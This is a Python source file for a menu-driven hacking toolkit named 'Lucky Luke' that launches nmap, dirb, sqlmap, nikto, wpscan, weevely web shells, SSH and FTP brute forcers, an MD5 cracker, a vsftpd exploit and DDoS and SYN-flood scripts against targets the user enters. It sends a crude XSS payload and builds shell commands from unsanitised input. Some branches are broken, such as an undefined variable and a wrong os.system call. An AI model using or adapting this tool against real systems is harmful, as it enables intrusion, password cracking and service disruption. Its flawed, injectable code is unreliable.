import hashlib
import os
import json
import subprocess
import urllib3
import socket
import requests
import colorama
import random
import string
from colorama import Fore, Back, Style, init
colorama.init()
print(Fore.YELLOW)
os.system("figlet    Lucky Luke")
print(Style.RESET_ALL)
print(Fore.RED)
print("""                        v1.0
      _________________________________________
       Coded by ertanszr. Please use only
       educational purpose. Not use illegally.
                 github.com/ertanszr-git
                 twitter.com/ertanszr
       ----------------------------------------- """)
print(Style.RESET_ALL)
print(Fore.YELLOW)
print("""
                    _,.
                 ,''   `.     __....__ 
               ,'        >.-''        ``-.__,)
             ,'      _,''           _____ _,'
            /      ,'           _.:':::_`:-._ 
           :     ,'       _..-''  \`'.;.`-:::`:. 
           ;    /       ,'  ,::'  .\,'`.`. `\::)`  
          /    /      ,'        \   `. '  )  )/ 
         /    /      /:`.     `--`'   \     '`
         `-._/      /::::)             )
            /      /,-.:(   , _   `.-' 
           ;      :(,`.`-' ',`.     ;
          :       |:\`' )      `-.._\ _
          |         `:-(             `)``-._ 
          |           `.`.        /``'      ``:-.-__,
          :           / `:\ .     :            ` \`-
           \        ,'   '}  `.   |
        _..-`.    ,'`-.   }   |`-'    
      ,'__    `-'' -.`.'._|   | 
          ```--..,.__.(_|.|   |::._
            __..','/ ,' :  `-.|::)_`.
            `..__..-'   |`.      __,' 
                        :  `-._ `  ;
                         \ \   )  /
                         .\ `.   /
                          ::    /
                          :|  ,'
                          :;,' 
                          `'
""")
print(Style.RESET_ALL)
print(Fore.YELLOW)
print("""

=> Usage :                                        |
- List Commands => help                           |
- The Network Mapper => nmap                      |
- Web Content Scanner => dirb                     |
- Deepmagic Information Gathering Tool => dmitry  |
- Weaponized Web Shell => weevely                 |
- Cross Side Scripting => xss                     |
- SQL Map => sql                                  |
- Web Server Scanner => nikto                     |
- Wordpress Scanner => wpscan                     |
- URL Crazy => urlcrazy                           |
- SSH Brute Forcer => ssh                         |
- FTP Brute Forcer => ftp                         |
- MD5 Cracker => md5crack                         |
- IP Tracer => iptrace                            |
- MD5 Generator => md5gen                         |
- Domain Identificator => whois                   |
- Subdomain Scanner => subdomain                  |
- exploit => vsftpd                               |
- Python SYN-ACK Flood => synack                  |
- Python DDOS Flood => ddos                       |
- Clear Terminal => clear                         |
""")
while True :
      veri = input("Choose Option => ")
      if veri == "help": 
            os.system("figlet Lucky Luke")
            print(""" 
=> Usage :                                        |
- List Commands => help                           |
- The Network Mapper => nmap                      |
- Web Content Scanner => dirb                     |
- Deepmagic Information Gathering Tool => dmitry  |
- Weaponized Web Shell => weevely                 |
- Cross Side Scripting => xss                     |
- SQL Map => sql                                  |
- Web Server Scanner => nikto                     |
- Wordpress Scanner => wpscan                     |
- URL Crazy => urlcrazy                           |
- SSH Brute Forcer => ssh                         |
- FTP Brute Forcer => ftp                         |
- MD5 Cracker => md5crack                         |
- IP Tracer => iptrace                            |
- MD5 Generator => md5gen                         |
- Domain Identificator => whois                   |
- Subdomain Scanner => subdomain                  |
- exploit => vsftpd                               |
- Python SYN-ACK Flood => synack                  |
- Python DDOS Flood => ddos                       |
- Clear Terminal => clear                         |

""")
      if veri == "nmap":
            os.system("figlet nmap")
            print("""

            1 - Standart Scan
            2 - Scan All TCP Ports
            3 - Scan All UDP Ports
            4 - Agressive Scan
            5 - Fast Scan
            6 - OS Scan
            7 - Scan Service Number
            8 - Scan Firewall
            9 - Scan All Ports (It can take too many time.)

            """)

            secimNmap = input("Choose Scan : ")
            ipNmap = input("Enter Ip or Domain : ")

            if secimNmap == "1" :
                  os.system("nmap -vv " + ipNmap)

            elif secimNmap == "2" :
                  os.system("nmap -sT -vv " + ipNmap)

            elif secimNmap == "3" :
                  os.system("nmap -sU -vv " + ipNmap)

            elif secimNmap == "4" :
                  os.system("nmap -A -vv " + ipNmap)

            elif secimNmap == "5" :
                  os.system("nmap -F -vv " + ipNmap)

            elif secimNmap == "6" :
                  os.system("nmap -O -vv " + ipNmap)

            elif secimNmap == "7" :
                  os.system("nmap -sV -vv " + ipNmap)

            elif secimNmap == "8" :
                  os.system("nmap -sA -vv " + ipNmap)

            elif secimNmap == "9" :
                  os.system("nmap -p- -vv " + ipNmap)

            else :
                  input("You Entered Wrong Choice.")
      if veri == "dirb":
            os.system("figlet Dirb")

            dirbDomain = input("Enter the domain or IP address : ")
            niktoDosyayolu = input("Enter file path if you have or enter nothing  (Example : /apache) : ")
            sslSecim = input("Choose http(1) or https(2) : ")

            if sslSecim == "1" :
                  os.system("dirb http://" + dirbDomain)

            elif sslSecim == "2" :
                  os.system("dirb https://" + dirbDomain)

            else :
                  input("You Entered Wrong Choice.")
      
      if veri == "dmitry":
            os.system("figlet dmitry")
            site = input("Enter target website =>")
            os.system("dmitry -w ", site)
            os.system("dmitry -o ", site)
            os.system("dmitry -i ", site)
            os.system("dmitry -n ", site)
            os.system("dmitry -s ", site)
            os.system("dmitry -e ", site)
            os.system("dmitry -p ", site)
      if veri == "weevely" :
            os.system("figlet weevely")
            print("""

            1 - Create Shell File
            2 - Execute Uploaded Shell File

    """)

            secimWeevely = input("Choose option :  ")

            if secimWeevely == "1" :
                  weevelyPass = input("Enter a password for file ")
                  weevelyDosyayolu = input("Enter the file path (Example : /home)")
                  os.system("weevely generate " + weevelyPass + " " + weevelyDosyayolu)

            elif secimWeevely == "2" : 
                  weevelyUrl = input("Enter url and execution path : (Örnek : http://blabla.com/uploads/)")
                  weevelyPass = input("Enter file password ")
                  os.system("weevely " + weevelyUrl + " " + weevelyPass)

            else : 
                  input("You Entered Wrong Choice.")
      if veri == "xss":
            os.system("figlet xss detection")
            target = input("Target URL : ")
            payload = ("<script>alert(Hacked by Rotherda!!!);</script>")
            req = requests.post(target + payload)
            if payload in req.text:
                  print ("XSS Found...")
                  print ("Attack Vector : "+payload)
            else:
                print ("Safe")
      if veri == "sql":
            os.system("figlet sqlmap")
            vulnsql = input("Target URL : ")
            os.system("sqlmap -u"+vulnsql+" --dbs --random-agent --tamper=space2comment ")
      if veri == "nikto":
            os.system("figlet nikto")
            print("""

            1 - Normal Scan (Scans 80 Port)
            2 - Learn Version Information
            3 - List Working Extentions
            4 - List All Extentions
            5 - Scan Spesific Port

            """)

            secimNikto = input("Choose Scan Type : ")
            ipNikto = input("Enter Ip or Domain ")
            niktoDosyayolu = input("Enter file path if you have or enter nothing  (Example : /apache) : ")


            if secimNikto == "1"  :
                  os.system("nikto -host " + ipNikto + " " + niktoDosyayolu )

            elif secimNikto == "2" :
                  os.system("nikto -Version -host " + ipNikto + " " + niktoDosyayolu)

            elif secimNikto == "3" :
                  os.system("nikto -Plugins -host " + ipNikto + " " + niktoDosyayolu)

            elif secimNikto == "4" :
                  os.system("nikto -list-plugins -host " + ipNikto + " " + niktoDosyayolu)

            elif secimNikto == "5" :
                  portNikto = input("Enter a port : ")
                  os.system("nikto -host "+ ipNikto + " -port " + portNikto + " " + niktoDosyayolu)

            else:
                  input("You Entered Wrong Choice.")
      if veri == "wpscan" :
            os.system("figlet wpscan")
            print("""
    
    1 - Normal Scan
    2 - Find Vulnarable Extentions
    3 - Find All Extentions
    4 - Find Popular Extentions
    5 - Find Vulnarable Themes
    6 - Find All Themes
    7 - Find Popular Themes
    8 - Find Config Files
    9 - Find Database Outputs
    
    """)

            secimWPScan = input("Choose scan type :  ")
            wpscanUrl = input("Enter url : ")
            if secimWPScan == "1" : 
                  os.system("wpscan --url " + wpscanUrl)

            elif secimWPScan == "2" : 
                  os.system("wpscan --url " + wpscanUrl + " --enumerate vp")

            elif secimWPScan == "3" : 
                  os.system("wpscan --url " + wpscanUrl + " --enumerate ap")

            elif secimWPScan == "4" : 
                  os.system("wpscan --url " + wpscanUrl + " --enumerate p")

            elif secimWPScan == "5" : 
                  os.system("wpscan --url " + wpscanUrl + " --enumerate vt")  

            elif secimWPScan == "6" : 
                  os.system("wpscan --url " + wpscanUrl + " --enumerate at")

            elif secimWPScan == "7" : 
                  os.system("wpscan --url " + wpscanUrl + " --enumerate t")

            elif secimWPScan == "8" : 
                  os.system("wpscan --url " + wpscanUrl + " --enumerate cb")

            elif secimWPScan == "9" : 
                  os.system("wpscan --url " + wpscanUrl + " --enumerate dbe")

            else :
                  input("You Entered Wrong Choice.")
      if veri == "urlcrazy":
            os.system("figlet urlcrazy")
            url = input("Target URL => ")
            os.system("urlcrazy "+ url)
      if veri == "ssh":
           os.system("figlet ssh brute force")
           hostd = input("Wordlist path => ")
           hosta = input("Username (If you have) => ")
           hostb = input("Host address => ")
           os.system("python3 sspy --wordlist "+hostd+" -U "+hosta+" -P 22 "+hostb)
      if veri == "ftp":
           os.system("figlet ftp brute force")
           hedef1 =  input("Target with port => ")
           dosyauser1 = input("Username path => ")
           dosyapass1 = input("Password path => ")
           host1 = input("Ip Address =>")
           os.system("medusa -U "+dosyauser1+" -P "+dosyapass1+" -h "+host1 +" -M ftp")
      if veri == "md5crack":
            os.system("figlet md5crack")
            dat2 = input("Target MD5 Hash ==> ")
            print("")
            print("_______________________________")
            print("")
            response = requests.get('http://www.nitrxgen.net/md5db/' + dat2).text
            print("Cracking result => " , response)
            print("")
            print("Cracked hash => " ,dat2)
            print("")
            print("_______________________________")
      if  veri == "iptrace":
            os.system("figlet iptrace")
            target5= input("[+]Target -> : ")
            data = subprocess.check_output(["curl",f"http://ip-api.com/json/" + target ]).decode("utf-8")
            json.loads(data)
            print("Ip Address   => " , json.loads(data)["query"])
            print("City => " , json.loads(data)["city"])
            print("Country  => " , json.loads(data)["country"])
            print("Postal Code  => " , json.loads(data)["zip"])
            print("Host   => " , json.loads(data)["isp"])
            print("Host   => " , json.loads(data)["org"])
            print("lat  => " , json.loads(data)["lat"])
            print("lat  => " , json.loads(data)["lon"])
            print("Enter lat and lon values on Google for the address. ")
      if veri == "md5gen":
            os.system("figlet md5 generator")
            user = input("Enter the text :  ")
            h = hashlib.md5(user.encode())
            h2 = h.hexdigest()        
            print(h2)
      if veri == "whois":
            os.system("figlet whois")
            klk = input("Target website => ")
            os.system("whois "+klk)
      if veri == "subdomain":
            os.system("figlet subdomain")
            obje = input("Target domain => ")
            obje2 = input("Saved filename =>")
            os.system("python3 subdom -d "+obje+" -o "+obje2)
      if veri == "vsftpd":
            ipad = input("Target host => ")
            os.system("python3 py-vsftpd-exploit.py "+ipad)
      if veri == "ddos":
            os.system("python2 ddoser.py")
      if veri == "synack":
            os.system("python3 synack.py")
      if veri == "whatweb":
            os.system("figlet whatweb")
            what = input(" target => ")
            os.system("whatweb "+what)            
      if veri == "clear":
            os.system("clear")

